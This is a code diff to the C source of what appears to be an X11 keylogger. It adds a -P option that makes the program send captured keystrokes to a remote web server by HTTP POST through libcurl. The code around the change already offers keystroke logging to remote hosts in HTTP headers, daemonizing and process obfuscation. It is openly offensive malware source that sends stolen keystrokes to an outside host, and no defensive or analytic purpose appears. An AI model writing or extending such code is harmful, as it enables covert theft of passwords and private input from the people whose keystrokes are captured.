@@ -126,9 +126,10 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	config->daemonize = 0;
 	config->obfuscate = 0;
 	config->log_remote_http_nodelay = 0;
+	config->log_remote_http_post = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "O:s:f:H:h:?r:qdo")) != -1){
+	while((c = getopt(argc, argv, "PO:s:f:H:h:?r:qdo")) != -1){
 		switch(c) {
 		  case 's':
 			if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
@@ -149,6 +150,8 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			strcpy(config->host, optarg);
 			config->log_remote_http = 1;
 			break;
+		  case 'P':
+		  	config->log_remote_http_post = 1;
 #endif
 		  case 'r':
 			config->remote_addr = optarg;
@@ -181,6 +184,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 #		   ifdef _HAVE_CURL
 			log(0, stderr, "   -h <HOST>       Log keystrokes to webserver within HTTP requests headers.\n");
 			log(0, stderr, "   -H <HOST>       like -h, but without buffering.\n");
+			log(0, stderr, "   -P              use POST instead of GET requests.\n");
 #		   endif
 			log(0, stderr, "   -d              Daemonize (requires -f or -r or both).\n");
 			log(0, stderr, "   -q              Be quiet (no output to console).\n");
@@ -203,6 +207,8 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 		fatal("Argument -d requires either logging to file or remote host (-r|-h|-f)");
 	if(config->obfuscate && !config->daemonize)
 		fatal("Argument -o requires daemonization (-d)");
+	if(config->log_remote_http_post && !config->log_remote_http)
+		fatal("Argument -P requires http logging (-h|-H)");
 
 	/* log to file if given, use stdout otherwise  */
 	if(config->logfile != NULL){
@@ -408,6 +414,10 @@ int transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow){
 	/* build http request and send */
 	curl_easy_setopt(curl, CURLOPT_URL, cfg->host );
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_blackhole);
+
+	if(cfg->log_remote_http_post)
+		curl_easy_setopt(curl, CURLOPT_POST, 1);
+
 	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 	if (curl_easy_perform(curl) != 0)
 		return 0;
